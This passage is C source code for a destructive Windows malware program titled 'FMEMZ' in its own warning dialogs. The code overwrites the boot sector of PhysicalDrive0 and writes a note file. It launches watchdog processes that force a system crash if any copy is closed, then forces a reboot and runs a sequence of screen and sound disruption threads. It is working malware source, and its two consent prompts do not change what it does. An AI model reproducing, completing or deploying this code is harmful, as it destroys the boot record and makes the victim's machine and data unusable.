	if (RtlAdjustPrivilege != NULL && NtRaiseHardError != NULL) {
		BOOLEAN tmp1; DWORD tmp2;
		((void(*)(DWORD, DWORD, BOOLEAN, LPBYTE))RtlAdjustPrivilege)(19, 1, 0, &tmp1);
		((void(*)(DWORD, DWORD, DWORD, DWORD, DWORD, LPDWORD))NtRaiseHardError)(0xc0000022, 0, 0, 0, 6, &tmp2);
	}
	HANDLE token;
	TOKEN_PRIVILEGES privileges;

	OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &token);

	LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &privileges.Privileges[0].Luid);
	privileges.PrivilegeCount = 1;
	privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

	AdjustTokenPrivileges(token, FALSE, &privileges, 0, (PTOKEN_PRIVILEGES)NULL, 0);
	ExitWindowsEx(EWX_REBOOT | EWX_FORCE, SHTDN_REASON_MAJOR_HARDWARE | SHTDN_REASON_MINOR_DISK);
}
void killWindows() {
	// Show cool MessageBoxes
	for (int i = 0; i < 20; i++) {
		CreateThread(NULL, 4096, thing8, NULL, NULL, NULL);
		CreateThread(NULL, 4096, window, NULL, NULL, NULL);
		Sleep(100);
	}
	killWindowsInstant();
}
typedef NTSTATUS(NTAPI *pRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
typedef NTSTATUS(NTAPI *pNtRaiseHardError)(NTSTATUS, ULONG, ULONG, PULONG_PTR, ULONG, PULONG);
DWORD WINAPI watchdogThread(LPVOID parameter) {
	int oproc = 0;
	char *fn = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
	GetProcessImageFileNameA(GetCurrentProcess(), fn, 512);
	Sleep(1000);
	for (;;) {
		HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
		PROCESSENTRY32 proc;
		proc.dwSize = sizeof(proc);
		Process32First(snapshot, &proc);
		int nproc = 0;
		do {
			HANDLE hProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, proc.th32ProcessID);
			char *fn2 = (char *)LocalAlloc(LMEM_ZEROINIT, 512);
			GetProcessImageFileNameA(hProc, fn2, 512);
			if (!lstrcmpA(fn, fn2)) nproc++;
			CloseHandle(hProc);
			LocalFree(fn2);
		} while (Process32Next(snapshot, &proc));
		CloseHandle(snapshot);
		if (nproc < oproc) {
			CreateThread(NULL, 0, thing8, NULL, 0, NULL);
			CreateThread(NULL, 0, window, NULL, 0, NULL);
			Sleep(2000);
			BOOLEAN bEnabled;
			ULONG uResp;
			HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
			pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
			pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
			RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
			NtRaiseHardError(0xDEADBEEF, 0, 0, NULL, 6, &uResp);
			Sleep(-1);
		}
		oproc = nproc;
		Sleep(10);
	}
}

DWORD WINAPI payloadThread(LPVOID lpParam) {
	HANDLE drive = CreateFileA("\\\\.\\PhysicalDrive0", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
	if (drive != INVALID_HANDLE_VALUE) {
		unsigned char *bootcode = (unsigned char *)LocalAlloc(LMEM_ZEROINIT, 65536);
		int i;
		for (i = 0; i < code1_len; i++) *(bootcode + i) = *(code1 + i);
		for (i = 0; i < code2_len; i++) *(bootcode + i + 0x1fe) = *(code2 + i);
		WriteFile(drive, bootcode, 65536, &wb, NULL);
		CloseHandle(drive);
	}
	HANDLE note = CreateFileA("\\note.txt", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
	if (note != INVALID_HANDLE_VALUE) {
		WriteFile(note, msg, msg_len, &wb, NULL);
		CloseHandle(note);
		ShellExecuteA(NULL, NULL, "notepad", "\\note.txt", NULL, SW_SHOWDEFAULT);
	}
	return 0;
}
int main() {
	FreeConsole();
	if (strstr(GetCommandLineA(), "/watchdog") != NULL) {
		CreateThread(NULL, 0, watchdogThread, NULL, 0, NULL);
		while (TRUE) Sleep(1000);
		return 0;
	}

	FreeConsole();
	if (MessageBoxA(NULL, "The software you just executed is considered malware.\r\nThis malware will harm your computer and makes it unusable.\r\nIf you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\nIf you know what this malware does and are using a safe environment to test, press Yes to start it.\r\n\r\nDO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", "FMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES ||
		MessageBoxA(NULL, "THIS IS THE LAST WARNING!\r\n\r\nTHE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\nSTILL EXECUTE IT?", "FMEMZ", MB_YESNO | MB_ICONWARNING) != IDYES) {
		ExitProcess(0);
	}

	wchar_t exePath[MAX_PATH];
	GetModuleFileNameW(NULL, exePath, MAX_PATH);

	for (int i = 0; i < 5; i++) {
		STARTUPINFOW si = { sizeof(STARTUPINFOW) };
		PROCESS_INFORMATION pi = {};
		wchar_t cmdLine[512];
		wcscpy_s(cmdLine, L"\"");
		wcscat_s(cmdLine, exePath);
		wcscat_s(cmdLine, L"\" /watchdog");
		CreateProcessW(NULL, cmdLine, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
		CloseHandle(pi.hProcess);
		CloseHandle(pi.hThread);
	}

	CreateThread(NULL, 0, payloadThread, NULL, 0, NULL);
	CreateThread(NULL, 0, watchdogThread, NULL, 0, NULL);
	Sleep(10000);
	CreateThread(0, 0, moos, 0, 0, 0);
	CreateThread(0, 0, crazymouse, 0, 0, 0);
	Sleep(10000);
	CreateThread(0, 0, memzsound, 0, 0, 0);
	CreateThread(0, 0, errcur, 0, 0, 0);
	Sleep(3000);
	CreateThread(0, 0, inv, 0, 0, 0);
	CreateThread(0, 0, opens, 0, 0, 0);
	Sleep(30000);
	HANDLE threadt = CreateThread(0, 0, thingеtunnel, 0, 0, 0);
	CreateThread(0, 0, winshake, 0, 0, 0);
	HANDLE thread = CreateThread(0, 0, thing6, 0, 0, 0);
	HANDLE thread1 = CreateThread(0, 0, window1, 0, 0, 0);
	Sleep(30000);
	TerminateThread(thread1, 0);
	CloseHandle(thread1);
	HANDLE thread2 = CreateThread(0, 0, window, 0, 0, 0);
	Sleep(1000);
	HANDLE thread7 = CreateThread(0, 0, thing7, 0, 0, 0);
	Sleep(60000);
	HANDLE snd = CreateThread(0, 0, soundlast, 0, 0, 0);
	HANDLE blsh = CreateThread(0, 0, blurshuffle, 0, 0, 0);
	Sleep(28000);
	TerminateThread(blsh, 0);
	CloseHandle(blsh);
	HANDLE thread8 = CreateThread(0, 0, thing8, 0, 0, 0);
	Sleep(1000);
	BOOLEAN bEnabled;
	ULONG uResp;
	HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
	pRtlAdjustPrivilege RtlAdjustPrivilege = (pRtlAdjustPrivilege)GetProcAddress(hNtdll, "RtlAdjustPrivilege");
	pNtRaiseHardError NtRaiseHardError = (pNtRaiseHardError)GetProcAddress(hNtdll, "NtRaiseHardError");
	RtlAdjustPrivilege(19, TRUE, FALSE, &bEnabled);
	NtRaiseHardError(0xDEADBEEF, 0, 0, NULL, 6, &uResp);
	Sleep(-1);
}